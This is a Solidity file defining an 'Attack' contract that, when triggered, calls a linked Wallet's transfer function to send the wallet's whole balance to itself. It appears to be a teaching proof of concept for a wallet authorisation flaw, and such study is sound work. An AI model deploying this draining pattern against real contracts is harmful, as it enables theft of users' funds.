// SPDX-License-Identifier: GLP-3.0

pragma solidity 0.8.7;
import "./Wallet.sol";

contract Attack {
    Wallet wallet;

    constructor(Wallet _wallet) public {
        wallet = Wallet(_wallet);
    }

    receive() external payable {}

    function attack() public {
        wallet.transfer(address(this), address(wallet).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
